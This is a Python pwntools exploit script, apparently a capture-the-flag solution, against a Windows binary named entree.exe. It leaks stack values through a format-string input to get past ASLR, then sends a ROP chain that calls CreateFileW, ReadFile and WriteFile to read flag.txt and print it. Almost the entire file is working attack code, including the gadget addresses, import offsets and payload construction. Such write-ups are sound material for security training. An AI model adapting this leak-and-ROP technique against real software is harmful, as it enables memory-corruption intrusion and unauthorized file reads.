from pwn import *

#conn = remote('127.0.0.1', 4141)
conn = process('./entree.exe')

'''
Dynamic Base    : "Present"
ASLR            : "Present"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "Present"
SEH             : "Present"
CFG             : "NotPresent"
RFG             : "NotPresent"
SafeSEH         : "NotPresent"
GS              : "Present"
Authenticode    : "NotPresent"
.NET            : "NotPresent"


relevant gadgets:
0x0000869E: pop ebx; ret;
0x00009696: pop eax; pop ebx; ret; 
0x00001382: pop ecx; pop ebp; ret; 
0x00003714: jmp dword ptr [ebx]; 
0x000093c7: mov eax, dword ptr [eax + ecx]; pop ebp; ret; 
0x0000a122: mov dword ptr [ecx], eax; pop esi; pop ebp; ret; 
'''

POP_EBX = 0x0000869E
POP_ECX_POP_EBP = 0x00001382
POP_EAX_POP_EBX = 0x00009696
JMP_MEM_AT_EBX = 0x00003714
MOV_EAX_TO_MEM_AT_ECX_POP_ESI_EBP = 0x0000a122
MOV_MEM_AT_EAX_PLUS_ECX_TO_EAX_POP_EBP = 0x000093c7
WC_FLAG_TXT_IN_DWORDS = [0x006c0066, 0x00670061, 0x0074002e, 0x00740078, 0x00000000]

CREATE_FILE_W_IMPORT_RVA = 0xF0F8
READ_FILE_IMPORT_RVA = 0xF0F0
GET_STD_HANDLE_IMPORT_RVA = 0xF044
WRITE_FILE_IMPORT_RVA = 0xF048


def main():
	# input("[+] Connect a debugger...")

	# leak 10 integers in hex from the stack
	print(conn.recvuntil(b'Enter number of bytes:').decode())
	conn.sendline(b'30')

	print(conn.recvuntil(b'Enter data:').decode())
	conn.sendline(b';x%' * 10) # b'%x;%x;%x;%x;%x;%x;%x;%x;%x;%x;'


	# calculate leaked offsets
	leaked_values = conn.recvline().rstrip().decode().split(';')
	print(f'[+] leaked_values: {leaked_values}')

	stack_canary = int(leaked_values[3], 16)        # turns out this is unnecessary
	print(f'[+] stack_canary: {hex(stack_canary)}') # still left it in though

	stack_leak = int(leaked_values[4], 16)
	print(f'[+] stack_leak: {hex(stack_leak)}')

	main_ret_ptr = stack_leak - 0x58
	print(f'[+] main_ret_ptr: {hex(main_ret_ptr)}')

	image_leak = int(leaked_values[5], 16)
	print(f'[+] image_leak: {hex(image_leak)}')

	image_base = image_leak - 0x1738
	print(f'[+] image_base: {hex(image_base)}')

	# write flag.txt in unicode to memory at main_ret_ptr - 0x1000
	payload = b''
	for i, dword in enumerate(WC_FLAG_TXT_IN_DWORDS):
		payload += p32(POP_EAX_POP_EBX + image_base)
		payload += p32(dword)
		payload += p32(0xdeadbeef)                            # junk ebx value
		payload += p32(POP_ECX_POP_EBP + image_base)
		payload += p32(main_ret_ptr - 0x1000 + i*4)
		payload += p32(0xdeadbeef)                            # junk ebp value
		payload += p32(MOV_EAX_TO_MEM_AT_ECX_POP_ESI_EBP + image_base)
		payload += p32(0xdeadbeef)                            # junk esi value
		payload += p32(0xdeadbeef)                            # junk ebp value

	payload += p32(POP_EBX + image_base)
	payload += p32(CREATE_FILE_W_IMPORT_RVA + image_base)
	payload += p32(JMP_MEM_AT_EBX + image_base)
	payload += p32(POP_ECX_POP_EBP + image_base)              # ret addr
	payload += p32(main_ret_ptr - 0x1000)                     # lpFileName
	payload += p32(0x10000000)                                # dwDesiredAccess
	payload += p32(0x0)                                       # dwShareMode
	payload += p32(0x0)                                       # lpSecurityAttributes
	payload += p32(0x3)                                       # dwCreationDisposition
	payload += p32(0x80)                                      # dwFlagsAndAttributes
	payload += p32(0x0)                                       # hTemplateFile

	# store the handle on the stack at main_ret_ptr - 0x900.
	# payload += p32(POP_ECX_POP_EBP + image_base)
	payload += p32(main_ret_ptr + 0x104)                      # future ReadFile hFile param
	payload += p32(0xdeadbeef) 								  # junk ebp value
	payload += p32(MOV_EAX_TO_MEM_AT_ECX_POP_ESI_EBP + image_base)
	payload += p32(0xdeadbeef)								  # junk esi value
	payload += p32(0xdeadbeef)								  # junk ebp value

	# read the file contents to the stack at main_ret_ptr - 0x900
	payload += p32(POP_EBX + image_base)
	payload += p32(READ_FILE_IMPORT_RVA + image_base)
	payload += p32(JMP_MEM_AT_EBX + image_base)
	payload += p32(POP_EBX + image_base)                      # ret addr
	payload += p32(0x12345678)                                # hFile
	payload += p32(main_ret_ptr - 0x900)                      # lpBuffer
	payload += p32(0x100)                                     # nNumberOfBytesToRead
	payload += p32(main_ret_ptr - 0x950)                      # lpNumberOfBytesRead
	payload += p32(0x0)                                       # lpOverlapped

	# get stdin file handle
	# payload += p32(POP_EBX + image_base)
	payload += p32(GET_STD_HANDLE_IMPORT_RVA + image_base)
	payload += p32(JMP_MEM_AT_EBX + image_base)
	payload += p32(POP_ECX_POP_EBP + image_base)              # ret addr
	payload += p32(0xFFFFFFF5)                                # nStdHandle (stdout)


	# store the handle on the stack at main_ret_ptr - 0x850.
	# payload += p32(POP_ECX_POP_EBP + image_base)
	payload += p32(main_ret_ptr + 0x14c) 					  # future WriteFile hFile param
	payload += p32(0xdeadbeef)  							  # junk ebp value
	payload += p32(MOV_EAX_TO_MEM_AT_ECX_POP_ESI_EBP + image_base)
	payload += p32(0xdeadbeef)                                # junk esi value
	payload += p32(0xdeadbeef)                                # junk ebp value

	# print main_ret_ptr - 0x900 to stdout
	payload += p32(POP_EBX + image_base)
	payload += p32(WRITE_FILE_IMPORT_RVA + image_base)
	payload += p32(JMP_MEM_AT_EBX + image_base)
	payload += p32(0xcafebabe)                                # ret addr
	payload += p32(0x12345678)                                # hFile
	payload += p32(main_ret_ptr - 0x900)                      # lpBuffer
	payload += p32(0x100)                                     # nNumberOfBytesToRead
	payload += p32(main_ret_ptr - 0x950)                      # lpNumberOfBytesRead
	payload += p32(0x0)                                       # lpOverlapped

	# rop payload + padding to crash main
	print(conn.recvuntil(b'Enter number of bytes:').decode())
	conn.sendline(str(main_ret_ptr + len(payload)).encode())

	print(conn.recvuntil(b'Enter data:').decode())
	conn.sendline((b'X' * (1024 * 1024) + payload)[::-1])

	conn.interactive()


if __name__ == "__main__":
	main()
